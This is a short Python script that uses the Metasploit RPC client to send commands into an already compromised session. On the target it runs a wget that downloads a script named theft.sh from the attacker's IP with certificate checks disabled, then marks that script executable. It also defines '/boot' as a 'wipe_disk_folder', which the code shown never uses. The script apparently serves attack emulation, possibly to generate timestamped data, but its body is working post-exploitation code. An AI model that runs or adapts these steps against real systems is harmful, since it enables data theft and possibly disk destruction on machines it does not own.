import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    if len(argv) != 4:
        print("Usage: {} Folder local_ip target_ip duration flag_finish".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]
    # flag_finish = argv[4]
    wipe_disk_folder = "/boot"

    client = MsfRpcClient('kali')

    shell = client.sessions.session('1')
    shell.write('wget --no-check-certificate http://{0}/downloads/theft.sh'.format(my_ip))
    shell.write('chmod 755 ./theft.sh')

    # print(flag_finish)


main(sys.argv)
